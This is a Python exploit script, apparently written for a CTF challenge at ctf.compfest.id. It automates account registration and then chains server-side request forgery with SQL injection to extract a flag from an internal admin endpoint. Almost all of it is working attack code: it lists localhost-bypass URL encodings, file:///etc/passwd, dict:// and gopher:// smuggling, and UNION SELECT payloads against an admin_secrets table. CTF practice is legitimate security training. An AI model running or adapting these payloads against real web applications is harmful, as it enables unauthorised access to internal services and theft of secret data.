#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_user(username, password):
    """Register a new user"""
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(f"{BASE_URL}/register", data=data)
    return response

def login_user(username, password):
    """Login and get session"""
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        cookies = response.cookies
        return cookies
    return None

def exploit_ssrf(cookies):
    """Exploit SSRF to access internal admin search endpoint"""
    
    # Various SSRF bypass techniques to access localhost
    ssrf_payloads = [
        # Using different localhost representations
        "http://127.0.0.1:5000/internal/admin/search?q=access_level",
        "http://localhost:5000/internal/admin/search?q=access_level",
        "http://0.0.0.0:5000/internal/admin/search?q=access_level",
        "http://0177.0.0.1:5000/internal/admin/search?q=access_level",  # Octal
        "http://2130706433:5000/internal/admin/search?q=access_level",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search?q=access_level",  # Hex
        "http://017700000001:5000/internal/admin/search?q=access_level",  # Octal combined
        "http://127.1:5000/internal/admin/search?q=access_level",  # Shortened
        "http://127.0.1:5000/internal/admin/search?q=access_level",  # Alternative
        # Using different ports or protocols
        "http://127.0.0.1:80/internal/admin/search?q=access_level",
        "http://127.0.0.1:8080/internal/admin/search?q=access_level",
        # Using different URL schemes
        "file:///etc/passwd",
        "dict://127.0.0.1:5000/internal/admin/search?q=access_level",
        "gopher://127.0.0.1:5000/_GET%20/internal/admin/search?q=access_level%20HTTP/1.1%0d%0aHost:%20127.0.0.1:5000%0d%0a%0d%0a",
    ]
    
    # SQL injection payloads to bypass the filter
    sql_payloads = [
        "access_level",
        "access_level' OR 1=1--",
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets WHERE access_level=3--",
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets--",
        "access_level' OR access_level=3--",
        "access_level' AND access_level<=3--",
        "access_level' OR access_level<=3--",
        "access_level' UNION SELECT 'Flag',secret_value FROM admin_secrets WHERE secret_name='Flag'--",
    ]
    
    print("[+] Testing SSRF bypass techniques...")
    
    for ssrf_url in ssrf_payloads:
        print(f"[*] Trying: {ssrf_url}")
        
        # Try different SQL injection payloads
        for sql_payload in sql_payloads:
            full_url = f"{ssrf_url.split('?')[0]}?q={urllib.parse.quote(sql_payload)}"
            
            data = {
                'photo_url': full_url
            }
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                
                # Check if we got a successful response
                if response.status_code == 200:
                    if "Flag" in response.text or "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag in response!")
                        print(f"[+] URL: {full_url}")
                        print(f"[+] Response preview: {response.text[:500]}")
                        return response.text
                    
                    # Check for error preview that might contain our response
                    if "Failed to render as image" in response.text:
                        print(f"[+] Got error preview, checking content...")
                        # Extract the error preview content
                        if "pre>" in response.text:
                            start = response.text.find("<pre>") + 5
                            end = response.text.find("</pre>")
                            if start > 4 and end > start:
                                preview = response.text[start:end]
                                if "Flag" in preview or "COMPFEST" in preview:
                                    print(f"[+] SUCCESS! Found flag in error preview!")
                                    print(f"[+] Preview: {preview}")
                                    return preview
                
            except Exception as e:
                print(f"[-] Error with {full_url}: {e}")
                continue
    
    return None

def main():
    print("[+] Dark Side of Asteroid - SSRF Exploit")
    print("[+] ====================================")
    
    # Register and login
    username = "exploit_user"
    password = "password123"
    
    print(f"[+] Registering user: {username}")
    register_user(username, password)
    
    print(f"[+] Logging in as: {username}")
    cookies = login_user(username, password)
    
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Exploit SSRF
    result = exploit_ssrf(cookies)
    
    if result:
        print("\n[+] EXPLOIT SUCCESSFUL!")
        print("[+] ===================")
        print(result)
    else:
        print("\n[-] Exploit failed. Trying alternative approaches...")
        
        # Try direct access to the internal endpoint
        print("[+] Trying direct access to internal endpoint...")
        try:
            response = requests.get(f"{BASE_URL}/internal/admin/search?q=access_level")
            print(f"[+] Direct access response: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Content: {response.text}")
        except Exception as e:
            print(f"[-] Direct access failed: {e}")

if __name__ == "__main__":
    main()
